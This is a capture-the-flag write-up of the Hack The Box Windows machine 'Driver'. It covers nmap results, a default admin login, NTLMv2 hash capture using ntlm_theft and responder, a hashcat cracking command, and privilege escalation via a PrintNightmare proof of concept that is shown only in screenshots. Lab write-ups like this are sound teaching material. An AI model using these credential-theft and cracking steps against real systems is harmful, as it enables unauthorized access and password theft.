---
description: >-
  Driver is an easy windows HTB machine inspired by the recent CVE-2021-1675
  PrintNightmare.
---

# Driver

The nmap scans shown that the ports 80, 135 and 445 are open

```
# Nmap 7.91 scan initiated Sat Oct 16 22:47:55 2021 as: /usr/bin/nmap -Pn -T4 --max-retries 1 --max-scan-delay 20 --open -oN nmap/Port_driver.htb.nmap --system-dns --stats-every 1s driver.htb
Nmap scan report for driver.htb (10.10.11.106)
Host is up (0.087s latency).
Not shown: 997 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
80/tcp  open  http
135/tcp open  msrpc
445/tcp open  microsoft-ds

# Nmap done at Sat Oct 16 22:48:02 2021 -- 1 IP address (1 host up) scanned in 7.47 seconds
```

Browsing to the port 80 we got the following prompt:

![](<../.gitbook/assets/image (52).png>)

`admin:admin` works! we got the following portal:

![](<../.gitbook/assets/image (56).png>)

![](<../.gitbook/assets/image (54).png>)

We can try and force a NTLMv2 hash theft. When a Windows user attempts to connect to a SMB server, if the server asks for authentication, the client will automatically provide it unless specifically restricted. The authentication which is sent is in the form of a hash, which can then be cracked to reveal the logged in user’s password. Using [https://github.com/Greenwolf/ntlm_theft](https://github.com/Greenwolf/ntlm_theft) and responder is easy.

`sudo responder -wrf --lm -v -I tun0`

``![](<../.gitbook/assets/image (53).png>)``

Generate the payload files with the following command:

`ntlm_theft.py — generate all — ip 10.10.14.93 — filename test`

Will result in multiple files generated, I tried several until test.lnk was catched by responder:

![](<../.gitbook/assets/image (55).png>)

Bruteforcing the hash returned the following password:

`hashcat -m 5600 hash.txt -a 3 /usr/share/wordlists/rockyou.txt --status`

``![](<../.gitbook/assets/image (46).png>)``

So we have username and password. Next thing I tried was to enumerate using these credentials without success. Found this link which is almost a writeup, lol: [https://www.jaacostan.com/2021/07/printnightmare-cve-2021-1675-poc.html](https://www.jaacostan.com/2021/07/printnightmare-cve-2021-1675-poc.html). So I conf my smb shared and proceded. BTW, to found where is your box `smb.conf` you can just run `testparm`: 

![](<../.gitbook/assets/image (58).png>)

Created the payload:

![](<../.gitbook/assets/image (49).png>)

Executed the python script... and sucess!

![](<../.gitbook/assets/image (48).png>)

![](<../.gitbook/assets/image (51).png>)

![](<../.gitbook/assets/image (57).png>)

rooted.
